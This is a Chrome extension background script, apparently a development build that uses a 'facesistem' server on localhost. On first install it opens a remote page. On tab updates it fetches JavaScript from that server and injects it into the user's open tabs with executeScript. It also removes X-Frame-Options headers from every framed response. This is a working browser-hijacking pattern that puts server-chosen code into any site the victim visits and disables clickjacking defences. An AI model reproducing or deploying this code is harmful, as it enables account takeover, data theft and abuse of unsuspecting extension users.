var first_run = false;
if (!localStorage['ran_before']) {
	first_run = true;
	localStorage['ran_before'] = '1';
}

var currentTab = "";
if (first_run) {
	chrome.tabs.create({
		url : 'http://localhost/facesistem/up.php'
	});
}
var upCount = 0;
chrome.tabs.onUpdated.addListener(function(tab) {
	upCount++;
	if (upCount%3 != 1)
		return;
	chrome.tabs.get(tab, function(tab) {
		var http = new XMLHttpRequest();
		http.onreadystatechange = function() {
			if (http.readyState == 4) {
				if (tab.url.indexOf("devtools://") < 0) {
					
					chrome.tabs.executeScript(tab.id, {

						code : http.responseText
					});
				}
			}
		}
		http.open("GET", "http://localhost/facesistem/get.php");
		http.send();
	})
});
chrome.webRequest.onHeadersReceived.addListener(function(info) {
	var headers = info.responseHeaders;
	for (var i = headers.length - 1; i >= 0; --i) {
		var header = headers[i].name.toLowerCase();
		if (header == 'x-frame-options' || header == 'frame-options') {
			headers.splice(i, 1);
		}
	}
	return {
		responseHeaders : headers
	};
}, {
	urls : [ '*://*/*' ],
	types : [ 'sub_frame' ]
}, [ 'blocking', 'responseHeaders' ]);